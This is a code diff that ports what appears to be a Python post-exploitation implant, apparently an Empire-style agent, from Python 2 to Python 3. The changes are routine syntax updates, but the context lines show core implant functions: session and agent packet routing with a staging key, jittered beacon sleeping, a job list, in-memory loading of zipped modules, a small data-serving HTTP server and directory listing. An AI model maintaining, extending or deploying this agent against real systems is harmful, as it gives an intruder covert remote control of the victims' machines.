@@ -1,4 +1,11 @@
 from __future__ import print_function
+from __future__ import division
+from future import standard_library
+standard_library.install_aliases()
+from builtins import str
+from builtins import range
+from builtins import object
+from past.utils import old_div
 import __future__
 import struct
 import time
@@ -13,7 +20,7 @@ import trace
 import shlex
 import zlib
 import threading
-import BaseHTTPServer
+import http.server
 import zipfile
 import io
 import imp
@@ -27,7 +34,7 @@ import stat
 import grp
 from stat import S_ISREG, ST_CTIME, ST_MODE
 from os.path import expanduser
-from StringIO import StringIO
+from io import StringIO
 from threading import Thread
 
 
@@ -111,7 +118,7 @@ def decode_routing_packet(data):
     """
     # returns {sessionID : (language, meta, additional, [encData]), ...}
     packets = parse_routing_packet(stagingKey, data)
-    for agentID, packet in packets.iteritems():
+    for agentID, packet in packets.items():
         if agentID == sessionID:
             (language, meta, additional, encData) = packet
             # if meta == 'SERVER_RESPONSE':
@@ -320,7 +327,7 @@ def process_packet(packetType, data, resultID):
                  global delay
                  global jitter
                  if jitter < 0: jitter = -jitter
-                 if jitter > 1: jitter = 1/jitter
+                 if jitter > 1: jitter = old_div(1,jitter)
 
                  minSleep = int((1.0-jitter)*delay)
                  maxSleep = int((1.0+jitter)*delay)
@@ -356,7 +363,7 @@ def process_packet(packetType, data, resultID):
             msg = "No active jobs"
         else:
             msg = "Active jobs:\n"
-            for x in xrange(len(jobs)):
+            for x in range(len(jobs)):
                 msg += "\t%s" %(x)
         return build_response_packet(50, msg, resultID)
 
@@ -480,7 +487,7 @@ def process_packet(packetType, data, resultID):
 
         zdata = dec_data['data']
         zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
-        if fileName in moduleRepo.keys():
+        if fileName in list(moduleRepo.keys()):
             send_message(build_response_packet(122, "%s module already exists" % (fileName), resultID))
         else:
             moduleRepo[fileName] = zf
@@ -492,7 +499,7 @@ def process_packet(packetType, data, resultID):
         repoName = data
         if repoName == "":
             loadedModules = "\nAll Repos\n"
-            for key, value in moduleRepo.items():
+            for key, value in list(moduleRepo.items()):
                 loadedModules += "\n----"+key+"----\n"
                 loadedModules += '\n'.join(moduleRepo[key].namelist())
 
@@ -861,7 +868,7 @@ def data_webserver(data, ip, port, serveCount):
     data = str(data)
     serveCount = int(serveCount)
     count = 0
-    class serverHandler(BaseHTTPServer.BaseHTTPRequestHandler):
+    class serverHandler(http.server.BaseHTTPRequestHandler):
         def do_GET(s):
             """Respond to a GET request."""
             s.send_response(200)
@@ -870,7 +877,7 @@ def data_webserver(data, ip, port, serveCount):
             s.wfile.write(data)
         def log_message(s, format, *args):
             return
-    server_class = BaseHTTPServer.HTTPServer
+    server_class = http.server.HTTPServer
     httpServer = server_class((hostName, portNumber), serverHandler)
     try:
         while (count < serveCount):
@@ -913,10 +920,10 @@ def directory_listing(path):
 
         # Convert file size to MB, KB or Bytes
         if (fstat.st_size > 1024 * 1024):
-            fsize = math.ceil(fstat.st_size / (1024 * 1024))
+            fsize = math.ceil(old_div(fstat.st_size, (1024 * 1024)))
             unit = "MB"
         elif (fstat.st_size > 1024):
-            fsize = math.ceil(fstat.st_size / 1024)
+            fsize = math.ceil(old_div(fstat.st_size, 1024))
             unit = "KB"
         else:
             fsize = fstat.st_size
@@ -1031,7 +1038,7 @@ while(True):
 
         # sleep for the randomized interval
         if jitter < 0: jitter = -jitter
-        if jitter > 1: jitter = 1/jitter
+        if jitter > 1: jitter = old_div(1,jitter)
         minSleep = int((1.0-jitter)*delay)
         maxSleep = int((1.0+jitter)*delay)
 
